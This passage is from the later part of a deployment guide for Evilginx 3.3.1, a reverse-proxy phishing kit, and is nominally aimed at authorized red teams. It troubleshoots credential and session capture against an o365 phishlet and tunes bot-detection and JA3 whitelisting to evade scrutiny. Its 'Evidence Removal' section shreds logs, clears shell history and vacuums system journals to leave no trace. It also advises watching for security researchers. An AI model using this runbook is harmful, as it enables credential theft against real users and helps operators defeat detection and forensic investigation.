# Verify autocert is enabled
config autocert

# Check domain is pointed to VPS
dig yourdomain.com +short
# Should return your VPS IP

# Ensure port 80 is accessible (needed for ACME challenge)
sudo ufw allow 80/tcp

# Try manual certificate
config autocert off
# Use developer mode for testing
./build/evilginx -developer -p ./phishlets

# Check Let's Encrypt rate limits
# https://letsencrypt.org/docs/rate-limits/
```

### Issue: Sessions Not Being Created

**Symptoms:**
- Lure URL accessible
- No sessions appear in `sessions` list

**Solution:**
```bash
# Enable debug logging
./build/evilginx -debug -p ./phishlets

# Check if phishlet is enabled
phishlets

# Verify lure is not paused
lures

# Check lure URL is correct
lures get-url 0

# Test from external IP (not VPS IP)

# Check whitelist/blacklist
blacklist
whitelist
```

### Issue: Credentials Not Being Captured

**Symptoms:**
- Sessions created
- No credentials in session data

**Solution:**
```bash
# Check phishlet configuration
cat phishlets/o365.yaml

# Verify credential keys match target site
# Use browser developer tools (F12) to inspect POST parameters

# Check if target site changed login form

# Enable debug mode
./build/evilginx -debug -p ./phishlets

# Test manually and watch logs
tail -f ~/.evilginx/logs/evilginx.log
```

### Issue: High False Positive Rate (ML Detection)

**Symptoms:**
- Legitimate users being blocked
- Too many bot detections

**Solution:**
```bash
# Lower ML threshold
config ml_threshold 0.5

# Enable learning mode
config ml_learning on

# Temporarily disable ML
config ml_detection off

# Check JA3 whitelist
ja3 whitelist list

# Add legitimate JA3 hashes
ja3 whitelist add HASH_HERE
```

### Issue: Cloudflare DNS Not Updating

**Symptoms:**
- DNS records not created automatically
- Certificate generation fails

**Solution:**
```bash
# Verify API token
config dns_api_key

# Test API token manually
curl -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
  -H "Authorization: Bearer YOUR_API_TOKEN" \
  -H "Content-Type: application/json"

# Check token permissions in Cloudflare dashboard

# Manually add DNS records in Cloudflare
# Then disable autocert
config autocert off
```

### Issue: Site Loads But Looks Broken

**Symptoms:**
- Pages load but CSS/JS broken
- Images not loading

**Solution:**
```bash
# Check sub_filters in phishlet
cat phishlets/o365.yaml | grep sub_filters

# May need to add more proxy_hosts
# Check browser console (F12) for blocked resources

# Add missing subdomains to phishlet

# Verify auto_filter is enabled
```

### Issue: Unable to Access via Cloudflare Proxy

**Symptoms:**
- Works with grey cloud (DNS only)
- Fails with orange cloud (proxied)

**Solution:**
```bash
# Cloudflare proxy requires different certificate
# Either:
# 1. Use DNS only mode (grey cloud)
# 2. Set up Cloudflare SSL mode to "Full"
# 3. Upload custom certificate to Cloudflare

# For testing, use DNS only mode
```

### Issue: Performance Problems

**Symptoms:**
- Slow response times
- High CPU usage
- Memory issues

**Solution:**
```bash
# Check system resources
htop

# Reduce traffic shaping strictness
config per_ip_rate_limit 200

# Disable resource-intensive features
config ml_detection off
config polymorphic off

# Upgrade VPS resources

# Enable caching
config ml_cache on
config polymorphic_cache on
```

### Getting Help

1. **Enable Debug Mode**
   ```bash
   ./build/evilginx -debug -p ./phishlets
   ```

2. **Check Logs**
   ```bash
   tail -100 ~/.evilginx/logs/evilginx.log
   ```

3. **Verify Configuration**
   ```bash
   config
   phishlets
   lures
   ```

4. **Test Basic Connectivity**
   ```bash
   curl -v https://login.yourdomain.com
   ```

---

## Cleanup and Evidence Removal

### Post-Engagement Cleanup Checklist

- [ ] Export and securely store captured data
- [ ] Deliver findings to client
- [ ] Delete all captured credentials from VPS
- [ ] Remove phishing infrastructure
- [ ] Clear logs and history
- [ ] Destroy VPS
- [ ] Document lessons learned

### Step 1: Export Captured Data

```bash
# Export sessions
sessions export ~/final_sessions_$(date +%Y%m%d).json

# Encrypt export
gpg -c ~/final_sessions_$(date +%Y%m%d).json

# Download to local machine
scp user@vps:~/final_sessions_*.json.gpg ~/local/path/

# Verify download
sha256sum ~/final_sessions_*.json.gpg
```

### Step 2: Delete Sensitive Data from VPS

```bash
# Stop Evilginx
pkill -f evilginx

# Securely delete database
shred -vfz -n 10 ~/.evilginx/data.db

# Delete all logs
shred -vfz -n 10 ~/.evilginx/logs/*

# Delete configuration
shred -vfz -n 10 ~/.evilginx/config.json

# Delete exported files
shred -vfz -n 10 ~/final_sessions_*.json
```

### Step 3: Clear Command History

```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear root history (if used)
sudo bash -c 'history -c'
sudo bash -c 'cat /dev/null > ~/.bash_history'

# Clear system logs
sudo journalctl --vacuum-time=1s
```

### Step 4: Remove Evilginx

```bash
# Delete Evilginx directory
cd ~
rm -rf ~/phishing/evilginx3

# Delete configuration
rm -rf ~/.evilginx
```

### Step 5: Remove DNS Records

1. **Login to Cloudflare**
2. Navigate to DNS settings
3. Delete all phishing-related records
4. Or delete entire domain from Cloudflare

### Step 6: Destroy VPS

**DigitalOcean:**
```bash
# Install doctl (DigitalOcean CLI)
# Or use web interface

# Delete droplet
doctl compute droplet delete YOUR_DROPLET_ID
```

**Vultr/Linode:**
- Use web interface to destroy instance
- Verify destruction
- Check billing to ensure no charges

**Manual Verification:**
```bash
# Try to SSH (should fail)
ssh user@old.vps.ip

# Verify DNS no longer resolves to old IP
dig yourdomain.com
```

### Step 7: Domain Management

**Option 1: Delete Domain**
- Remove from Cloudflare
- Let registration expire
- Do not renew

**Option 2: Transfer Domain**
- Transfer to client
- Or to isolated account
- Update ownership records

### Step 8: Final Security Checks

```bash
# Check for data remnants
# On local machine:

# Search for any saved credentials
grep -r "password" ~/

# Search for session files
find ~/ -name "*session*"

# Search for Evilginx-related files
find ~/ -name "*evilginx*"
```

### Step 9: Documentation

Create final report including:
- Engagement dates
- Targets contacted
- Success rates
- Captured credentials (sanitized)
- Lessons learned
- Recommendations
- Evidence of authorization

### Step 10: Secure Data Destruction

```bash
# For local copies of captured data
# After client receives data:

# Securely delete
shred -vfz -n 35 ~/captured_sessions.json

# Verify deletion
ls -la ~/

# Empty trash/recycle bin
```

---

## Additional Resources

### Recommended Reading

- [OWASP Phishing Guide](https://owasp.org/www-community/attacks/Phishing)
- [NIST Phishing Guidelines](https://www.nist.gov/programs-projects/phishing)
- [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504)

### Useful Tools

- **GoPhish**: Email phishing framework
- **SET**: Social Engineering Toolkit
- **King Phisher**: Phishing campaign toolkit
- **Modlishka**: Alternative reverse proxy

### Legal Resources

- Consult local cybersecurity laws
- Review computer fraud and abuse acts
- Understand data protection regulations (GDPR, CCPA, etc.)
- Engage legal counsel for contracts

---

## Summary

You've now completed a comprehensive deployment of Evilginx 3.3.1 Private Dev Edition with:

✅ Secure VPS infrastructure  
✅ Domain and Cloudflare configuration  
✅ Advanced evasion features enabled  
✅ Professional phishing lures  
✅ Operational security measures  
✅ Monitoring and maintenance procedures  
✅ Proper cleanup protocols

### Key Takeaways

1. **Always Get Authorization** - Never proceed without written permission
2. **Security First** - Harden infrastructure before deployment
3. **Monitor Continuously** - Watch for anomalies and security researchers
4. **Document Everything** - Maintain detailed records
5. **Clean Up Thoroughly** - Leave no trace after engagement
6. **Act Ethically** - Use for legitimate security testing only

### Final Checklist

Before going live:
- [ ] Authorization documents secured
- [ ] VPS hardened
- [ ] Cloudflare configured
- [ ] All advanced features tested
- [ ] Lures created and tested
- [ ] Monitoring systems active
- [ ] Telegram notifications working
- [ ] Backup plan ready
- [ ] Destruction plan prepared
- [ ] Client contact established

---

**Remember: This tool is powerful and can cause significant harm if misused. Always operate within legal and ethical boundaries.**

**For questions about specific features, refer to individual configuration sections above.**

**Good luck with your authorized security testing! 🛡️**

